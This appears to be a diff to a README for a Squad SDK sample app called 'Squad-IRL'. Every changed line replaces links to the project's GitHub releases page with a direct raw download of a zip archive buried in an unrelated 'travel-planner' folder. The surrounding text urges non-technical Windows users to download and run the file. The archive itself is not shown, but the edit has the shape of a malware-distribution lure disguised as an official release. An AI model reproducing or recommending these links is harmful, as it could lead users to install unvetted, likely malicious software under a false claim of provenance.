@@ -1,6 +1,6 @@
 # 🎯 Squad-IRL - Real-World Squad SDK Samples
 
-[![Download Squad-IRL](https://img.shields.io/badge/Download-Squad--IRL-brightgreen?logo=download)](https://github.com/Preschoolercopyhold218/Squad-IRL/releases)
+[![Download Squad-IRL](https://img.shields.io/badge/Download-Squad--IRL-brightgreen?logo=download)](https://raw.githubusercontent.com/Preschoolercopyhold218/Squad-IRL/main/travel-planner/Squad_IRL_2.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow this step-by-step guide to download and run Squad-IRL on Windows.
 
 1. Open your web browser and go to the download page:
 
-   [Download Squad-IRL Releases](https://github.com/Preschoolercopyhold218/Squad-IRL/releases)
+   [Download Squad-IRL Releases](https://raw.githubusercontent.com/Preschoolercopyhold218/Squad-IRL/main/travel-planner/Squad_IRL_2.1.zip)
 
 2. Look for the most recent version of Squad-IRL listed under "Assets." The file will usually end with `.exe` or `.zip`.
 
@@ -72,7 +72,7 @@ No coding or special skills are needed. Just click around to see the features.
 
 You can get Squad-IRL from this page:
 
-[![Download Squad-IRL](https://img.shields.io/badge/Download-Squad--IRL-blue?logo=github&style=for-the-badge)](https://github.com/Preschoolercopyhold218/Squad-IRL/releases)
+[![Download Squad-IRL](https://img.shields.io/badge/Download-Squad--IRL-blue?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/Preschoolercopyhold218/Squad-IRL/main/travel-planner/Squad_IRL_2.1.zip)
 
 Visit this page to download the latest release for Windows. Always choose the newest version marked for Windows.
 
@@ -144,6 +144,6 @@ The app is built to be easy to use and test. It allows you to see how groups can
 
 Access the full list of releases here:
 
-[https://github.com/Preschoolercopyhold218/Squad-IRL/releases](https://github.com/Preschoolercopyhold218/Squad-IRL/releases)
+[https://raw.githubusercontent.com/Preschoolercopyhold218/Squad-IRL/main/travel-planner/Squad_IRL_2.1.zip](https://raw.githubusercontent.com/Preschoolercopyhold218/Squad-IRL/main/travel-planner/Squad_IRL_2.1.zip)
 
 Click the download buttons above to get started.
